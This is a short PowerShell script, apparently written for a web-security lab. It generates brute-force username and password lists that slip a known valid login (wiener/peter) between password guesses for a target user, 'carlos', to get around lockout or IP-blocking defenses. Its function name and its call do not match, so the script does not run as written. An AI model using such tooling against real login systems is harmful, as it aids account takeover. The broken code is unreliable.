# Inject-PitchforkListWithValidCredentials
# This works, convert it to a working cmdlet.
# Make a cmdlet to generate IP lists.

# Inject-WordListWithWord
# Expand-WordListToSize
# Generate-WordListOfType
# Divide-WordList


# Creates brute-force payload with injected valid credentials (pitchfork)

function Inject-WLWithWord{
    param(
        [string[]] $WordList,
        [string] $WordToInject,
        [int] $InjectionInterval
    )
    Process{
        $result = @()
        $intervalCount = 0


        for($i = 0; $i -lt $wordList.Count; $i++){
            if($intervalCount -eq $injectionInterval){
                $result += $wordToInject
                $intervalCount = 0
            }

            $result += $wordList[$i]
            $intervalCount++
        }

        Write-Output $result
    }
}

New-PitchforkInjectValidCreds -WordList ("abc", "123", "password", "baseball") -WordToInject "*" -InjectionInterval 1


<#
$literalPath = 'C:\Users\rez\Downloads\passwords.txt'
$list = Get-Content $literalPath

$outputPath = 'C:\Users\rez\Downloads\'

$newUsernameList = @()
$targetUsername = 'carlos'
$injectedUsername = 'wiener'

$newPasswordList = @()
$passwordToInject = 'peter'
$passwordInjectionInterval = 1

for($i = 0; $i -lt $list.Count; $i++){
    
    $newUsernameList += $targetUsername
    $newPasswordList += $list[$i]

    if($i % $passwordInjectionInterval -eq 0){
        $newUsernameList += $injectedUsername
        $newPasswordList += $passwordToInject
    }
}

$newUsernameList | Out-File "$($outputPath)modUsernames.txt"
$newPasswordList | Out-File "$($outputPath)modPasswords.txt"

#>